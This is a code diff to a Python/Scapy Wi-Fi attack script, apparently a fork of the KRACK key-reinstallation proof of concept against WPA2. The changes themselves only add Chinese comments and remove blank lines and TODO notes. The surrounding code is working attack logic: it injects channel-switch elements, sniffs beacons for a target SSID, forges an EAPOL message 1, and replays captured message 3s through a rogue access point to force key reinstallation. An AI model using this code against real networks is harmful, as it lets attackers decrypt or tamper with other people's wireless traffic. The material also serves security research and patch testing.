@@ -232,10 +232,10 @@ def append_csa(p, channel, count=1):
 	while isinstance(el, Dot11Elt):
 		prevel = el
 		el = el.payload
-
 	prevel.payload = construct_csa(channel, count)
 	return p
 
+# 取得 beacon frame 的 ssid func.
 def get_tlv_value(p, typee):
 	if not p.haslayer(Dot11Elt): return None
 	el = p[Dot11Elt]
@@ -245,6 +245,7 @@ def get_tlv_value(p, typee):
 		el = el.payload
 	return None
 
+# 印出 func.
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
 	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
@@ -374,7 +375,6 @@ class ClientState():
 			return
 		self.msg3s.append(msg3)
 
-
 	def update_state(self, state):
 		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
 		self.state = state
@@ -388,7 +388,6 @@ class ClientState():
 	def is_state(self, state):
 		return self.state == state
 
-	# TODO: Also forward when attack has failed?
 	def should_forward(self, p):
 		if args.group:
 			# Forwarding rules when attacking the group handshake
@@ -468,7 +467,6 @@ class KRAckAttack():
 				log(DEBUG, "Listening on channel %d" % chan)
 				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # , opened_socket=self.sock_real
 				if ps and len(ps) >= 1: break
-
 		if ps and len(ps) >= 1:
 			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
 			self.sock_real.set_channel(actual_chan)
@@ -530,7 +528,6 @@ class KRAckAttack():
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
 
-				# FIXME: Warning if msg1 was not detected. Or generate it ourselves.
 				packet_list = client.msg3s
 				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				packet_list.insert(1, p)
@@ -538,7 +535,6 @@ class KRAckAttack():
 				for p in packet_list: self.sock_rogue.send(p)
 				client.msg3s = []
 
-				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
 				client.attack_start()
 			else:
 				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
